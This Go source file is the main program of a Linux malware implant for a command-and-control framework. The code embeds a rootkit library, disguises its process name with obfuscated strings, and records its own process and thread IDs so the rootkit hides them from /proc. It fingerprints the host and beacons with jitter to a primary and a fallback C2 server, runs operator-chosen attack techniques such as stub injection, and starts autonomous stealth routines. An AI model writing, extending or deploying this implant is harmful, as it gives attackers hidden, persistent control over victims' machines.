package main

import (
	_ "embed"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"syscall"
	"time"

	"core/mon/internal/config"
	"core/mon/internal/obf"
	"core/mon/internal/protocol"
	"core/mon/internal/ttp"
)

// rootkitPayload embeds the rootkit payload at build time.
// The file is copied to cmd/agent/payload/rootkit.so by the Makefile before building.
//
//go:embed payload/rootkit.so
var rootkitPayload []byte

func main() {
	syscall.Setsid() //nolint

	serverAddr := flag.String("server", config.DefaultServer, "C2 server address (host:port)")
	idleInterval := flag.Duration("interval", mustParseDuration(config.DefaultInterval), "idle beacon interval")
	jitter := flag.Float64("jitter", 0.3, "jitter fraction for idle interval (0.0-1.0)")
	verbose := flag.Bool("verbose", false, "enable verbose output")
	flag.Parse()

	if *serverAddr == "" {
		os.Exit(1)
	}

	// Share rootkit payload with install_rootkit TTP
	ttp.RootkitSO = rootkitPayload

	// Masquerade process comm name (obfuscated constant)
	_ = ttp.Masquerade(obf.D(obf.Masq))

	// Register our PID and all thread TIDs in the mark file.
	// Go creates multiple OS threads (goroutines scheduled on LWPs).
	// Each TID appears in /proc independently — we hide all of them.
	if err := writeAllTIDsToMark(ttp.HideMarkPath); err != nil && *verbose {
		fmt.Fprintf(os.Stderr, "pid mark: %v\n", err)
	}

	hostname, _ := os.Hostname()
	agentID := protocol.DeriveAgentID(config.SharedSecret, hostname)

	// Derive rawsock callback address for TTP 11 stub bake (I-01 model).
	// Explicit RawsockCBAddr takes priority; otherwise derive from FallbackServer host:9443.
	rawsockCBAddr := config.RawsockCBAddr
	if rawsockCBAddr == "" && config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			rawsockCBAddr = net.JoinHostPort(fbHost, "9443")
		}
	}

	// Derive KCC address for K-series: explicit KCCAddr takes priority,
	// otherwise derive from FallbackServer host + ":9444".
	kccAddr := config.KCCAddr
	if kccAddr == "" && config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			kccAddr = net.JoinHostPort(fbHost, "9444")
		}
	}

	// Derive C2 port from server address for sysfs registration (K-02).
	c2Port := "9443"
	if _, port, err := net.SplitHostPort(*serverAddr); err == nil && port != "" {
		c2Port = port
	}

	// Agent binary path for sysfs filesystem hiding (K-02).
	agentPath, _ := os.Executable()

	// R-01: collect environment fingerprint once at startup.
	// Sent on every check-in so operator has visibility before issuing TTPs.
	envReport := ttp.CollectEnvFingerprint([]string{"cron", "crond", "rsyslogd", "syslogd"})

	// R-04: C2 endpoints — primary (Cloudflare) always; fallback (relay direct) is
	// emergency-only, activated after emergencyThreshold consecutive primary failures.
	// This avoids exposing the relay IP in routine traffic patterns.
	primaryEndpoint := *serverAddr
	emergencyEndpoint := config.FallbackServer

	// K-series starts immediately — autonomous, no server dependency.
	// Does not wait for first check-in; contacts relay:9444 directly.
	go ttp.StartKSeries(kccAddr, config.SharedSecret, c2Port, agentPath)

	// Initial jitter sleep before first beacon
	if !*verbose {
		ttp.JitteredSleep(10*time.Second, 0.5)
	}

	var lastTTP int
	var lastResult, lastError string

	// Track which endpoint is currently reachable (used when dispatching TTP 11
	// so the injected stub uses the correct C2 IP).
	activeEndpoint := primaryEndpoint

	// O-01: exponential backoff — no maxRetries, only TTP 99/222 can stop the loop.
	// maxBackoff capped at 90s so agents reconnect quickly when server comes back up.
	consecutiveFails := 0
	const maxBackoffShift = 6
	maxBackoff := 90 * time.Second

	// R-04: track consecutive primary (L1) failures to decide when to add L2.
	// L2 (relay direct) is only included after emergencyThreshold consecutive L1 failures.
	primaryFails := 0
	const emergencyThreshold = 20

	for {
		var err error
		var cmd *protocol.Command

		// Build endpoint slice: always try L1; add L2 only in emergency.
		endpoints := []string{primaryEndpoint}
		if emergencyEndpoint != "" && primaryFails >= emergencyThreshold {
			endpoints = append(endpoints, emergencyEndpoint)
		}

		// Inject pending K-series report into this check-in if no TTP result is pending.
		// K-series runs as a background goroutine; this is the handoff point to the server.
		if lastTTP == 0 {
			if stTTP, stResult := ttp.TakePendingStealthReport(); stTTP != 0 {
				lastTTP = stTTP
				lastResult = stResult
			}
		}

		cmd, activeEndpoint, err = ttp.BeaconAny(endpoints, agentID, lastTTP, lastResult, lastError, &envReport)
		lastTTP, lastResult, lastError = 0, "", ""

		if err != nil {
			lastError = err.Error()
			consecutiveFails++
			primaryFails++
			shift := consecutiveFails
			if shift > maxBackoffShift {
				shift = maxBackoffShift
			}
			backoff := *idleInterval * time.Duration(1<<uint(shift))
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			ttp.JitteredSleep(backoff, *jitter)
			continue
		}

		// Successful check-in: reset general backoff always.
		consecutiveFails = 0
		// Reset primary failure counter only when L1 itself responded.
		// If we recovered via L2, keep primaryFails so L2 stays available.
		if activeEndpoint == primaryEndpoint {
			primaryFails = 0
		}

		if cmd.TTP != 0 {
			if cmd.Params == obf.D(obf.KillPhrase) {
				os.Exit(0)
			}

			lastTTP = cmd.TTP
			// Use activeEndpoint so TTP 11 injects the correct reachable C2 IP.
			// Pass rawsockCBAddr so TTP 11 bakes relay direct IP into stub (I-01 model).
			lastResult, err = ttp.Dispatch(cmd.TTP, cmd.Params, activeEndpoint, agentID, config.SharedSecret, rawsockCBAddr)
			if err != nil {
				lastError = err.Error()
				lastResult = ""
			}

			// Active server — fast re-beacon
			time.Sleep(time.Duration(rand.Intn(5001)) * time.Millisecond)
		} else {
			ttp.JitteredSleep(*idleInterval, *jitter)
		}
	}
}

// writeAllTIDsToMark writes the main PID and all OS thread TIDs to the mark file.
// Go schedules goroutines on multiple OS threads (LWPs), each with its own TID in /proc.
// We write all of them so the rootkit hides every thread entry.
func writeAllTIDsToMark(path string) error {
	// 0644: world-readable so rootkit.so can read it from any user context
	f, err := os.OpenFile(path, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	pid := os.Getpid()
	fmt.Fprintf(f, "%d\n", pid)

	// Read our own task directory to find all thread TIDs
	taskDir := fmt.Sprintf("/proc/%d/task", pid)
	entries, err := os.ReadDir(taskDir)
	if err != nil {
		return nil // best-effort: main PID already written
	}
	for _, e := range entries {
		tid := e.Name()
		if tid != fmt.Sprintf("%d", pid) { // avoid duplicate
			fmt.Fprintf(f, "%s\n", tid)
		}
	}
	return nil
}

func mustParseDuration(s string) time.Duration {
	if s == "" {
		return 30 * time.Second
	}
	d, err := time.ParseDuration(s)
	if err != nil {
		return 30 * time.Second
	}
	return d
}
